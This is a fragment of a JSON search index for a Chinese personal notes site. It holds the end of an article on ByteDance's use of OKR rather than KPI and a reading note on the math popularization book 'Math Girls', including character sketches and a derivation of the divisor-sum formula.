\u90a3\u4e48\uff0c\u4e3a\u4ec0\u4e48\u4ed6\u4eec\u9009\u62e9\u7528 OKR \u800c\u4e0d\u662f KPI \u5462\uff1f\u5434\u4f2f\u51e1\u8001\u5e08\u63d0\u5230\u4e86\u4e00\u4e2a\u73b0\u8c61\uff0c\u53eb\u505a KPI \u7684\u8bc5\u5492\uff0c\u6307\u6807\u4e00\u786e\u5b9a\u7684\u65f6\u5019\uff0c\u4f60\u5c31\u6ca1\u5fc5\u8981\u5173\u5fc3\u7ed3\u679c\uff0c\u4e5f\u6ca1\u5fc5\u8981\u5173\u5fc3\u76ee\u6807\uff0c\u53ea\u9700\u8981\u5173\u5fc3\u6307\u6807\u3002\u6307\u6807\u662f\u624b\u6bb5\uff0c\u76ee\u6807\u548c\u7ed3\u679c\u624d\u662f\u76ee\u7684\uff0c\u8001\u5e08\u8fd8\u7528\u4e86 \u90d1\u4eba\u4e70\u5c65 5 \u8fd9\u4e2a\u6545\u4e8b\u6765\u8bf4\u660e\u624b\u6bb5\u548c\u76ee\u6807\u7684\u4e0d\u540c\u3002 \u4e3a\u4ec0\u4e48 KPI \u4f1a\u5b58\u5728\u5f0a\u7aef\uff1f\u4f60\u8003\u6838\u4ec0\u4e48\uff0c\u4f60\u5c31\u5f97\u5230\u4ec0\u4e48\uff0c\u770b\u8d77\u6765\u5f88\u7f8e\u597d\uff0c\u4f46\u662f\u4f60\u771f\u6b63\u60f3\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u53ef\u80fd\u6ca1\u6709\u529e\u6cd5\u5f88\u597d\u5730\u53bb\u8003\u6838\u3002\u6bd4\u5982\u79d1\u7814\uff0c\u6211\u4eec\u5f80\u5f80\u6ca1\u6709\u529e\u6cd5\u5f88\u597d\u5730\u53bb\u8003\u6838\u79d1\u7814\u6210\u679c\u7684\u4ef7\u503c\uff0c\u6240\u4ee5\u6211\u4eec\u8003\u6838\u7684\u662f\u8bba\u6587\uff0c\u4ee5\u81f3\u4e8e\u73b0\u5728\u8bb8\u591a\u60c5\u51b5\u4e0b \u505a\u79d1\u7814 = \u5199\u8bba\u6587\uff0c\u9ad8\u6c34\u5e73\u7684\u79d1\u7814 = \u9ad8\u5f71\u54cd\u56e0\u5b50\u7684\u8bba\u6587\u3002\u8fd9\u5c31\u662f KPI \u7684\u8bc5\u5492\u3002 \u6982\u62ec\u6765\u8bb2\uff0c OKR \u6709\u5229\u4e8e\u5173\u952e\u7ed3\u679c\u7684\u5b9e\u73b0\uff0c\u540c\u65f6\u4fc3\u8fdb\u4e86\u5458\u5de5\u4e4b\u95f4\u7684\u4e92\u76f8\u5b66\u4e60\u548c\u76f8\u4e92\u8ffd\u8d76\uff0c\u4fc3\u8fdb\u4e86\u5185\u90e8\u7684\u4eba\u624d\u6d8c\u73b0\u3002 \u603b\u7ed3\u4ee5\u4e0a\u7684\u5185\u5bb9\uff0c Tag \u601d\u7ef4\u3001\u5927\u4e2d\u53f0\u3001 OKR \uff0c\u8fd9\u4e5f\u8bb8\u5c31\u662f\u5b57\u8282\u8df3\u52a8\u6210\u529f\u7684\u539f\u56e0\u3002 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5. OKR"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E5%95%86%E4%B8%9A/1.%E6%AF%8F%E5%91%A8%E5%95%86%E4%B8%9A%E8%AF%84%E8%AE%BA_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8/#6","text":"[1] \u5f97\u5230APP.\u300a\u5434\u4f2f\u51e1-\u6bcf\u5468\u5546\u4e1a\u8bc4\u8bba\u300b [2] \u5f97\u5230APP.\u300a\u90b5\u8861\u5934\u6761\u300b [3] InfoQ. \u7f16\u8bd1\u901f\u5ea6\u63d0\u5347 700%\uff0c\u5b57\u8282\u8df3\u52a8\u4e2d\u53f0\u6280\u672f\u63ed\u79d8 [4] \u5f97\u5230APP.\u300a\u6881\u5b81-\u4ea7\u54c1\u601d\u7ef430\u8bb2\u300b [5] \u767e\u5ea6\u767e\u79d1. \u90d1\u4eba\u4e70\u5c65","title":"6. \u53c2\u8003\u6587\u732e"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/","text":"\u6570\u5b66\u5973\u5b69 # \u76ee\u5f55 # \u6570\u5b66\u5973\u5b69 \u76ee\u5f55 1. \u6982\u8ff0 1.1. \u5185\u5bb9\u7b80\u4ecb 1.2. \u4f5c\u8005\u7b80\u4ecb 1.3. \u4eba\u7269\u7b80\u4ecb 2. \u7b2c1\u7ae0 \u6570\u5217\u548c\u6570\u5b66\u6a21\u578b 2.1. \u6545\u4e8b\u60c5\u8282 2.2. \u6570\u5217\u667a\u529b\u9898\u6ca1\u6709\u6b63\u786e\u7b54\u6848 3. \u7b2c2\u7ae0 \u4e00\u5c01\u540d\u53eb\u6570\u5b66\u516c\u5f0f\u7684\u60c5\u4e66 3.1. \u6545\u4e8b\u60c5\u8282 3.2. \u6240\u6709\u7ea6\u6570\u4e4b\u548c 4. \u7b2c3\u7ae0 \\omega\u7684\u534e\u5c14\u5179 5. \u7b2c4\u7ae0 \u6590\u6ce2\u90a3\u5951\u6570\u5217\u548c\u751f\u6210\u51fd\u6570 6. \u7b2c5\u7ae0 \u57fa\u672c\u4e0d\u7b49\u5f0f 7. \u7b2c6\u7ae0 \u5728\u7c73\u5c14\u5609\u65c1\u8fb9 8. \u7b2c7\u7ae0 \u5377\u79ef 9. \u7b2c8\u7ae0 \u8c03\u548c\u6570 10. \u7b2c9\u7ae0 \u6cf0\u52d2\u5c55\u5f00\u548c\u5df4\u585e\u5c14\u95ee\u9898 11. \u7b2c10\u7ae0 \u5206\u62c6\u6570 12. \u603b\u7ed3 12.1. \u539f\u4e66\u53c2\u8003\u6587\u732e 12.2. \u672c\u6587\u53c2\u8003\u6587\u732e 1. \u6982\u8ff0 # 1.1. \u5185\u5bb9\u7b80\u4ecb # \u300a\u6570\u5b66\u5973\u5b69\u300b\u4ee5\u5c0f\u8bf4\u7684\u5f62\u5f0f\u5c55\u5f00\uff0c\u91cd\u70b9\u63cf\u8ff0\u4e00\u7fa4\u5e74\u8f7b\u4eba\u63a2\u7d22\u6570\u5b66\u4e2d\u7684\u7f8e\u3002\u5185\u5bb9\u7531\u6d45\u5165\u6df1\uff0c\u6570\u5b66\u8bb2\u89e3\u90e8\u5206\u5341\u5206\u7cbe\u5999\uff0c\u88ab\u79f0\u4e3a\u201c\u7edd\u8d5e\u7684\u521d\u7b49\u6570\u5b66\u79d1\u666e\u4e66\u201d\u3002\u5185\u5bb9\u6d89\u53ca\u6570\u5217\u548c\u6570\u5b66\u6a21\u578b\u3001\u6590\u6ce2\u90a3\u5951\u6570\u5217\u3001\u5377\u79ef\u3001\u8c03\u548c\u6570\u3001\u6cf0\u52d2\u5c55\u5f00\u3001\u5df4\u585e\u5c14\u95ee\u9898\u3001\u5206\u62c6\u6570\u7b49\uff0c\u975e\u5e38\u9002\u5408\u5bf9\u6570\u5b66\u611f\u5174\u8da3\u7684\u521d\u9ad8\u4e2d\u751f\u4ee5\u53ca\u6210\u4eba\u9605\u8bfb 1 \u3002 1.2. \u4f5c\u8005\u7b80\u4ecb # \u4f5c\u8005\u7ed3\u57ce\u6d69\uff0c\u65e5\u672c\u8d44\u6df1\u6280\u672f\u4f5c\u5bb6\u548c\u7a0b\u5e8f\u5458\u3002\u4e8c\u5341\u5e74\u6765\u7b14\u8015\u4e0d\u8f8d\uff0c\u5728\u7f16\u7a0b\u8bed\u8a00\u3001\u8bbe\u8ba1\u6a21\u5f0f\u3001\u6570\u5b66\u3001\u5bc6\u7801\u6280\u672f\u7b49\u9886\u57df\uff0c\u7f16\u5199\u8457\u4f5c\u4e09\u5341\u4f59\u672c\u3002\u4ee3\u8868\u4f5c\u6709\u300a\u6570\u5b66\u5973\u5b69\u300b\u7cfb\u5217\u3001\u300a\u7a0b\u5e8f\u5458\u7684\u6570\u5b66\u300b\u7b49 1 \u3002 1.3. \u4eba\u7269\u7b80\u4ecb # \u6211 \uff1a\u4e66\u4e2d\u7684\u4e3b\u89d2\uff0c\u4ee5\u7b2c\u4e00\u4eba\u79f0\u89c6\u89d2\u5bf9\u6545\u4e8b\u8fdb\u884c\u53d9\u8ff0\uff0c\u672c\u6587\u4e3a\u4e86\u65b9\u4fbf\u5199\u4f5c\uff0c\u4e0b\u9762\u5c31\u7528 \u7537\u4e3b \u6765\u6307\u4ee3\u4e3b\u89d2\u4e86\u3002\u7537\u4e3b\u662f\u4e00\u540d\u9ad8\u4e8c\u5b66\u751f\uff0c\u4e0d\u559c\u6b22\u8fd0\u52a8\uff0c\u4e5f\u6ca1\u4ec0\u4e48\u670b\u53cb\uff0c\u6700\u559c\u6b22\u7684\u5c31\u662f\u5c55\u5f00\u6570\u5b66\u516c\u5f0f\uff0c\u603b\u662f\u5728\u56fe\u4e66\u5ba4\u4e00\u4e2a\u4eba\u9762\u671d\u7b14\u8bb0\u672c\u5199\u5199\u7b97\u7b97\u3002 \u7c73\u5c14\u5609 \uff1a\u6570\u5b66\u5b66\u9738\uff0c\u5e74\u7ea7\u6570\u5b66\u7b2c\u4e00\uff0c\u4f46\u603b\u5206\u662f\u7b2c\u4e8c\uff0c\u843d\u540e\u4e8e\u90fd\u5bab\u3002\u9ad8\u4e00\u4e0e\u7537\u4e3b\u7ed3\u8bc6\uff0c\u4e24\u4eba\u7ecf\u5e38\u4e00\u8d77\u8ba8\u8bba\u6570\u5b66\u95ee\u9898\uff0c\u7ecf\u5e38\u7528\u4e00\u6d41\u7684\u89e3\u6cd5\u6253\u52a8\u7537\u4e3b\u3002 \u6cf0\u6735\u62c9 \uff1a\u6570\u5b66\u4e00\u822c\u7684\u6d3b\u529b\u5c11\u5973\uff0c\u548c\u7537\u4e3b\u5728\u540c\u4e00\u6240\u521d\u4e2d\u6bd5\u4e1a\uff0c\u6bd4\u7537\u4e3b\u5c0f\u4e00\u5c4a\uff0c\u6240\u4ee5\u662f\u9ad8\u4e00\u5b66\u751f\uff0c\u5e73\u65f6\u7ecf\u5e38\u5411\u7537\u4e3b\u53d1\u95ee\u3002 \u90fd\u5bab \uff1a\u5e74\u7ea7\u7b2c\u4e00\uff0c\u64c5\u957f\u4f53\u80b2\uff0c\u5728\u4e66\u4e2d\u51fa\u73b0\u8f83\u5c11\u3002 \u6751\u6728\u8001\u5e08 \uff1a\u77e5\u8bc6\u6e0a\u535a\u7684\u6570\u5b66\u8001\u5e08\uff0c\u6709\u65f6\u5019\u4f1a\u7ed9\u7537\u4e3b\u548c\u7c73\u5c14\u5609\u51fa\u9898\uff0c\u8ba9\u4ed6\u4eec\u81ea\u7531\u601d\u8003\u3002 \u76c8\u76c8 \uff1a\u94a2\u7434\u7231\u597d\u8005\u534f\u4f1a\u201c\u6700\u5f3a\u97f3\u201d\u7684\u4f1a\u957f\uff0c\u5076\u5c14\u4f1a\u548c\u7c73\u5c14\u5609\u4e00\u8d77\u7ec3\u7434\u3002 2. \u7b2c1\u7ae0 \u6570\u5217\u548c\u6570\u5b66\u6a21\u578b # 2.1. \u6545\u4e8b\u60c5\u8282 # \u672c\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u4e86\u7537\u4e3b\u548c\u7c73\u5c14\u5609\u7684\u76f8\u9047\u8fc7\u7a0b\uff0c\u7c73\u5c14\u5609\u7ed9\u7537\u4e3b\u5ff5\u4e86\u51e0\u4e2a\u6570\u5217\uff0c\u88ab\u7537\u4e3b\u63a5\u4e0a\u4e86\uff0c\u4e24\u4eba\u5c31\u50cf\u5bf9\u4e0a\u4e86\u6697\u53f7\uff0c\u786e\u8ba4\u8fc7\u773c\u795e\uff0c\u90fd\u662f\u641e\u6570\u5b66\u7684\u4eba\u3002 2.2. \u6570\u5217\u667a\u529b\u9898\u6ca1\u6709\u6b63\u786e\u7b54\u6848 # \u6570\u5217\u9898\u63d0\u4f9b\u7684\u6709\u9650\u7684\u51e0\u4e2a\u6570\u5b57\uff0c\u800c\u6570\u5217\u672c\u8eab\u662f\u65e0\u9650\u5ef6\u7eed\u7684\uff0c\u5c31\u50cf\u770b\u8d77\u6765\u5f88\u7b80\u5355\u7684 1, 2, 3, 4 ,\\cdots \u8fd9\u6837\u7684\u6570\u5217\uff0c\u6211\u4eec\u5f88\u81ea\u7136\u5730\u4f1a\u60f3\u5230\u4e0b\u4e00\u4e2a\u6570\u5e94\u8be5\u662f 5 \uff0c\u4f46\u5176\u5b9e\u540e\u9762\u7684\u6570\u4e5f\u53ef\u4ee5\u662f 10, 20, 30, 40,\\cdots \u6ee1\u8db3\u4e0b\u9762\u7684\u8868\u8fbe\u5f0f a_n = [((x-1) \\mod 4 ) + 1] * 10^{\\lfloor(x / 4) \\rfloor} , (n \\in N_+) \\tag{1.1} \u6211\u4eec\u65e0\u6cd5\u53d1\u73b0\u6570\u5217\u7684\u89c4\u5f8b\uff0c\u771f\u6b63\u7684\u6570\u5217\u6a21\u578b\u662f\u4e00\u773c\u770b\u4e0d\u51fa\u6765\u7684\u3002\u5982\u4e0b\u9762\u8fd9\u4e2a\u6570\u5217 1, 2, 3, 4, 6, 9, 8, 12, 18, 27, \\cdots \u5176\u7b54\u6848\u53ef\u80fd\u662f\u8fd9\u6837\u7684 {\\underbrace{2^0 3^0}_{\\text{\u6307\u6570\u4e4b\u548c\u4e3a0}}}, {\\underbrace{2^1 3^0, 2^0 3^1}_{\\text{\u6307\u6570\u4e4b\u548c\u4e3a1}}} , {\\underbrace{2^2 3^0, 2^1 3^1, 2^0 3^2}_{\\text{\u6307\u6570\u4e4b\u548c\u4e3a2}}} , {\\underbrace{2^3 3^0, 2^2 3^1, 2^1 3^2, 2^0 3^3}_{\\text{\u6307\u6570\u4e4b\u548c\u4e3a3}}} , \\cdots \u8fd9\u5c31\u5f15\u51fa\u4e86\u540e\u9762\u7684 \u8d28\u6570\u5206\u89e3 \u95ee\u9898\uff0c\u5373\u4e66\u4e2d\u6240\u8bf4\u7684\u201c\u4e16\u754c\u4e0a\u53ea\u6709\u4e24\u4e2a\u8d28\u6570\u201d\u7684\u8bdd\u9898\u3002 3. \u7b2c2\u7ae0 \u4e00\u5c01\u540d\u53eb\u6570\u5b66\u516c\u5f0f\u7684\u60c5\u4e66 # 3.1. \u6545\u4e8b\u60c5\u8282 # \u8fd9\u4e00\u7ae0\u4e3b\u8981\u8bb2\u8ff0\u4e86\u7537\u4e3b\u548c\u6cf0\u6735\u62c9\u7684\u76f8\u9047\u8fc7\u7a0b\u3002\u7537\u4e3b\u6536\u5230\u4e00\u5c01\u6765\u81ea\u6cf0\u6735\u62c9\u7684\u4fe1\uff0c\u4fe1\u4e2d\u8bf4\u5230\u6cf0\u6735\u62c9\u5e0c\u671b\u7537\u4e3b\u80fd\u591f\u6559\u5979\u5982\u4f55\u5b66\u597d\u6570\u5b66\uff0c\u4e8e\u662f\u4e24\u4eba\u76f8\u7ea6\u5728\u9636\u68af\u6559\u5ba4\u3002 3.2. \u6240\u6709\u7ea6\u6570\u4e4b\u548c # \u7c73\u5c14\u5609\u7ed9\u7537\u4e3b\u51fa\u4e86\u4e00\u9053\u9898\uff0c\u9898\u76ee\u5982\u4e0b \u6709\u4e00\u4e2a\u6b63\u6574\u6570 n \u5982\u4f55\u6c42\u51fa n \u7684\u6240\u6709\u7ea6\u6570\u4e4b\u548c\uff1f \u7b26\u53f7\u5b9a\u4e49 \uff1a \u7528 p_0, p_1, p_2, \\dots, p_m \u6765\u8868\u793a\u8d28\u6570 \u7528 a_0, a_1, a_2 \\dots, a_m \u6765\u8868\u793a\u6307\u6570 m + 1 \u8868\u793a\u5c06 n \u5206\u89e3\u8d28\u56e0\u6570\u540e\u8d28\u56e0\u6570\u7684\u4e2a\u6570 \u7537\u4e3b\u7684\u89e3\u6cd5 \uff1a \u5c06\u6b63\u6574\u6570 n \u8fdb\u884c\u56e0\u5f0f\u5206\u89e3 \u5047\u8bbe p_0, p_1, p_2, \\dots, p_m \u4e3a\u8d28\u6570\uff0c a_0, a_1, a_2 \\dots, a_m \u4e3a\u6b63\u6574\u6570\uff0c\u5219\u6709 n = p_0^{a_0} \\times p_1^{a_1} \\times p_2^{a_2} \\times \\dots \\times p_m^{a_m} \\tag{2.1} n \u7684\u7ea6\u6570 T_n \u5c31\u53ef\u4ee5\u8868\u73b0\u4e3a\u4ee5\u4e0b\u5f62\u5f0f\u3002 T_n = p_0^{b_0} \\times p_1^{b_1} \\times p_2^{b_2} \\times \\dots \\times p_m^{b_m} \\tag{2.2} \u5176\u4e2d b_m \u5c31\u662f\u4ee5\u4e0b\u6574\u6570\u3002 b_0 = 0, 1, 2,3, \\dots , a_0 \\text{\u4e2d\u7684\u4efb\u610f\u6570} b_1 = 0, 1, 2,3, \\dots , a_1 \\text{\u4e2d\u7684\u4efb\u610f\u6570} b_m = 0, 1, 2,3, \\dots , a_m \\text{\u4e2d\u7684\u4efb\u610f\u6570} \u5c06\u516c\u5f0f 2.2 \u5c55\u5f00\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230\u516c\u5f0f 2.3 \u3002 { \\begin{aligned} T_n &= (1 + p_0 + p_0^2 + \\dots + p_0^{a_0}) & \\\\ &\\times (1 + p_1 + p_1^2 + \\dots + p_1^{a_1}) &\\\\ &\\times (1 + p_2 + p_2^2 + \\dots + p_2^{a_2}) &\\\\ &\\times \\dots &\\\\ &\\times (1 + p_m + p_m^2 + \\dots + p_m^{a_m}) &\\\\ \\end{aligned} } \\tag{2.3} \u8fd9\u4e2a\u516c\u5f0f\u663e\u7136\u5f88\u4e0d\u7b80\u6d01\uff0c\u4e0b\u9762\u770b\u7c73\u5c14\u5609\u7684\u89e3\u7b54\u3002 \u7c73\u5c14\u5609\u7684\u89e3\u6cd5 \uff1a \u5c06\u5927\u4e8e1\u7684\u6574\u6570 n \u8fdb\u884c\u4ee5\u4e0b\u5f62\u5f0f\u7684\u8d28\u56e0\u6570\u5206\u89e3 n = \\prod_{k = 0}^m p_k^{a_k} \\tag{2.4} \u5047\u8bbe p_k \u4e3a\u4e92\u4e0d\u76f8\u540c\u7684\u8d28\u6570\uff0c a_k \u4e3a\u6b63\u6574\u6570\u3002\u90a3\u4e48\uff0c\u6b64\u65f6 n \u7684\u6240\u6709\u7ea6\u6570\u4e4b\u548c T_n \u5c31\u53ef\u4ee5\u7528\u4ee5\u4e0b\u516c\u5f0f\u6765\u6c42\u89e3\u3002 { \\begin{aligned} T_n & = \\prod_{k = 0}^m \\sum_{i = 0}^m p_k^{a_i} & \\\\ & = \\prod_{k = 0}^m \\frac{1 - p_k^{a_k + 1}}{1 - p_k} & \\\\ \\tag{2.5} \\end{aligned} } 4. \u7b2c3\u7ae0 \\omega \u7684\u534e\u5c14\u5179 # 5. \u7b2c4\u7ae0 \u6590\u6ce2\u90a3\u5951\u6570\u5217\u548c\u751f\u6210\u51fd\u6570 # 6. \u7b2c5\u7ae0 \u57fa\u672c\u4e0d\u7b49\u5f0f # 7. \u7b2c6\u7ae0 \u5728\u7c73\u5c14\u5609\u65c1\u8fb9 # 8. \u7b2c7\u7ae0 \u5377\u79ef # 9. \u7b2c8\u7ae0 \u8c03\u548c\u6570 # 10. \u7b2c9\u7ae0 \u6cf0\u52d2\u5c55\u5f00\u548c\u5df4\u585e\u5c14\u95ee\u9898 # 11. \u7b2c10\u7ae0 \u5206\u62c6\u6570 # 12. \u603b\u7ed3 # 12.1. \u539f\u4e66\u53c2\u8003\u6587\u732e # 12.2. \u672c\u6587\u53c2\u8003\u6587\u732e # [1] \u5f97\u5230APP.\u300a\u6570\u5b66\u5973\u5b69\u300b[EB/OL].https://m.igetget.com/hybrid/v2/ebook/detail?bid=qPKdG1m9B8MaveyJdxRzNnKYlqgVZ3koXB3o5pL7E4m1r26kQjXDAPObGkYgJ4pN,2016.01. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u6570\u5b66\u5973\u5b69"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#_1","text":"","title":"\u6570\u5b66\u5973\u5b69"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#_2","text":"\u6570\u5b66\u5973\u5b69 \u76ee\u5f55 1. \u6982\u8ff0 1.1. \u5185\u5bb9\u7b80\u4ecb 1.2. \u4f5c\u8005\u7b80\u4ecb 1.3. \u4eba\u7269\u7b80\u4ecb 2. \u7b2c1\u7ae0 \u6570\u5217\u548c\u6570\u5b66\u6a21\u578b 2.1. \u6545\u4e8b\u60c5\u8282 2.2. \u6570\u5217\u667a\u529b\u9898\u6ca1\u6709\u6b63\u786e\u7b54\u6848 3. \u7b2c2\u7ae0 \u4e00\u5c01\u540d\u53eb\u6570\u5b66\u516c\u5f0f\u7684\u60c5\u4e66 3.1. \u6545\u4e8b\u60c5\u8282 3.2. \u6240\u6709\u7ea6\u6570\u4e4b\u548c 4. \u7b2c3\u7ae0 \\omega\u7684\u534e\u5c14\u5179 5. \u7b2c4\u7ae0 \u6590\u6ce2\u90a3\u5951\u6570\u5217\u548c\u751f\u6210\u51fd\u6570 6. \u7b2c5\u7ae0 \u57fa\u672c\u4e0d\u7b49\u5f0f 7. \u7b2c6\u7ae0 \u5728\u7c73\u5c14\u5609\u65c1\u8fb9 8. \u7b2c7\u7ae0 \u5377\u79ef 9. \u7b2c8\u7ae0 \u8c03\u548c\u6570 10. \u7b2c9\u7ae0 \u6cf0\u52d2\u5c55\u5f00\u548c\u5df4\u585e\u5c14\u95ee\u9898 11. \u7b2c10\u7ae0 \u5206\u62c6\u6570 12. \u603b\u7ed3 12.1. \u539f\u4e66\u53c2\u8003\u6587\u732e 12.2. \u672c\u6587\u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#1","text":"","title":"1. \u6982\u8ff0"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#11","text":"\u300a\u6570\u5b66\u5973\u5b69\u300b\u4ee5\u5c0f\u8bf4\u7684\u5f62\u5f0f\u5c55\u5f00\uff0c\u91cd\u70b9\u63cf\u8ff0\u4e00\u7fa4\u5e74\u8f7b\u4eba\u63a2\u7d22\u6570\u5b66\u4e2d\u7684\u7f8e\u3002\u5185\u5bb9\u7531\u6d45\u5165\u6df1\uff0c\u6570\u5b66\u8bb2\u89e3\u90e8\u5206\u5341\u5206\u7cbe\u5999\uff0c\u88ab\u79f0\u4e3a\u201c\u7edd\u8d5e\u7684\u521d\u7b49\u6570\u5b66\u79d1\u666e\u4e66\u201d\u3002\u5185\u5bb9\u6d89\u53ca\u6570\u5217\u548c\u6570\u5b66\u6a21\u578b\u3001\u6590\u6ce2\u90a3\u5951\u6570\u5217\u3001\u5377\u79ef\u3001\u8c03\u548c\u6570\u3001\u6cf0\u52d2\u5c55\u5f00\u3001\u5df4\u585e\u5c14\u95ee\u9898\u3001\u5206\u62c6\u6570\u7b49\uff0c\u975e\u5e38\u9002\u5408\u5bf9\u6570\u5b66\u611f\u5174\u8da3\u7684\u521d\u9ad8\u4e2d\u751f\u4ee5\u53ca\u6210\u4eba\u9605\u8bfb 1 \u3002","title":"1.1. \u5185\u5bb9\u7b80\u4ecb"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#12","text":"\u4f5c\u8005\u7ed3\u57ce\u6d69\uff0c\u65e5\u672c\u8d44\u6df1\u6280\u672f\u4f5c\u5bb6\u548c\u7a0b\u5e8f\u5458\u3002\u4e8c\u5341\u5e74\u6765\u7b14\u8015\u4e0d\u8f8d\uff0c\u5728\u7f16\u7a0b\u8bed\u8a00\u3001\u8bbe\u8ba1\u6a21\u5f0f\u3001\u6570\u5b66\u3001\u5bc6\u7801\u6280\u672f\u7b49\u9886\u57df\uff0c\u7f16\u5199\u8457\u4f5c\u4e09\u5341\u4f59\u672c\u3002\u4ee3\u8868\u4f5c\u6709\u300a\u6570\u5b66\u5973\u5b69\u300b\u7cfb\u5217\u3001\u300a\u7a0b\u5e8f\u5458\u7684\u6570\u5b66\u300b\u7b49 1 \u3002","title":"1.2. \u4f5c\u8005\u7b80\u4ecb"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#13","text":"\u6211 \uff1a\u4e66\u4e2d\u7684\u4e3b\u89d2\uff0c\u4ee5\u7b2c\u4e00\u4eba\u79f0\u89c6\u89d2\u5bf9\u6545\u4e8b\u8fdb\u884c\u53d9\u8ff0\uff0c\u672c\u6587\u4e3a\u4e86\u65b9\u4fbf\u5199\u4f5c\uff0c\u4e0b\u9762\u5c31\u7528 \u7537\u4e3b \u6765\u6307\u4ee3\u4e3b\u89d2\u4e86\u3002\u7537\u4e3b\u662f\u4e00\u540d\u9ad8\u4e8c\u5b66\u751f\uff0c\u4e0d\u559c\u6b22\u8fd0\u52a8\uff0c\u4e5f\u6ca1\u4ec0\u4e48\u670b\u53cb\uff0c\u6700\u559c\u6b22\u7684\u5c31\u662f\u5c55\u5f00\u6570\u5b66\u516c\u5f0f\uff0c\u603b\u662f\u5728\u56fe\u4e66\u5ba4\u4e00\u4e2a\u4eba\u9762\u671d\u7b14\u8bb0\u672c\u5199\u5199\u7b97\u7b97\u3002 \u7c73\u5c14\u5609 \uff1a\u6570\u5b66\u5b66\u9738\uff0c\u5e74\u7ea7\u6570\u5b66\u7b2c\u4e00\uff0c\u4f46\u603b\u5206\u662f\u7b2c\u4e8c\uff0c\u843d\u540e\u4e8e\u90fd\u5bab\u3002\u9ad8\u4e00\u4e0e\u7537\u4e3b\u7ed3\u8bc6\uff0c\u4e24\u4eba\u7ecf\u5e38\u4e00\u8d77\u8ba8\u8bba\u6570\u5b66\u95ee\u9898\uff0c\u7ecf\u5e38\u7528\u4e00\u6d41\u7684\u89e3\u6cd5\u6253\u52a8\u7537\u4e3b\u3002 \u6cf0\u6735\u62c9 \uff1a\u6570\u5b66\u4e00\u822c\u7684\u6d3b\u529b\u5c11\u5973\uff0c\u548c\u7537\u4e3b\u5728\u540c\u4e00\u6240\u521d\u4e2d\u6bd5\u4e1a\uff0c\u6bd4\u7537\u4e3b\u5c0f\u4e00\u5c4a\uff0c\u6240\u4ee5\u662f\u9ad8\u4e00\u5b66\u751f\uff0c\u5e73\u65f6\u7ecf\u5e38\u5411\u7537\u4e3b\u53d1\u95ee\u3002 \u90fd\u5bab \uff1a\u5e74\u7ea7\u7b2c\u4e00\uff0c\u64c5\u957f\u4f53\u80b2\uff0c\u5728\u4e66\u4e2d\u51fa\u73b0\u8f83\u5c11\u3002 \u6751\u6728\u8001\u5e08 \uff1a\u77e5\u8bc6\u6e0a\u535a\u7684\u6570\u5b66\u8001\u5e08\uff0c\u6709\u65f6\u5019\u4f1a\u7ed9\u7537\u4e3b\u548c\u7c73\u5c14\u5609\u51fa\u9898\uff0c\u8ba9\u4ed6\u4eec\u81ea\u7531\u601d\u8003\u3002 \u76c8\u76c8 \uff1a\u94a2\u7434\u7231\u597d\u8005\u534f\u4f1a\u201c\u6700\u5f3a\u97f3\u201d\u7684\u4f1a\u957f\uff0c\u5076\u5c14\u4f1a\u548c\u7c73\u5c14\u5609\u4e00\u8d77\u7ec3\u7434\u3002","title":"1.3. \u4eba\u7269\u7b80\u4ecb"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#2-1","text":"","title":"2. \u7b2c1\u7ae0 